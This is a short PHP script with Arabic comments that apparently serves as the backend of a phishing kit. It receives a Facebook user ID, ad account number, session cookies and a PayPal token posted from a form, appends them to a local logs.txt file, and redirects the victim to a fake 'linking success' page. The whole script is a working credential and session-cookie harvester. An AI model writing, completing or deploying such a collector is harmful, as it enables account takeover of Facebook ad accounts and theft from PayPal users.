<?php
// التأكد من أن الطلب يتم عبر POST فقط
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // استقبال البيانات من الفورم
    $c_user = $_POST["c_user"] ?? "غير معروف";
    $adaccount = $_POST["adaccount"] ?? "غير معروف";
    $cookies = $_POST["cookie"] ?? "غير موجود";
    $paypal_token = $_POST["paypaltoken"] ?? "غير متوفر";

    // تسجيل البيانات (اختياري)
    $logData = "معرف الحساب: $c_user\nرقم الحساب الإعلاني: $adaccount\nالكوكيز: $cookies\nتوكن PayPal: $paypal_token\n";
    file_put_contents("logs.txt", $logData, FILE_APPEND);

    // إعادة توجيه المستخدم لصفحة نجاح الربط
    header("Location: done.html");
    exit();
} else {
    // إذا لم يكن الطلب عبر POST، أظهر رسالة خطأ
    http_response_code(405); // Method Not Allowed
    echo "❌ طلب غير صحيح! يُسمح فقط بالطلبات من خلال POST.";
}
?>
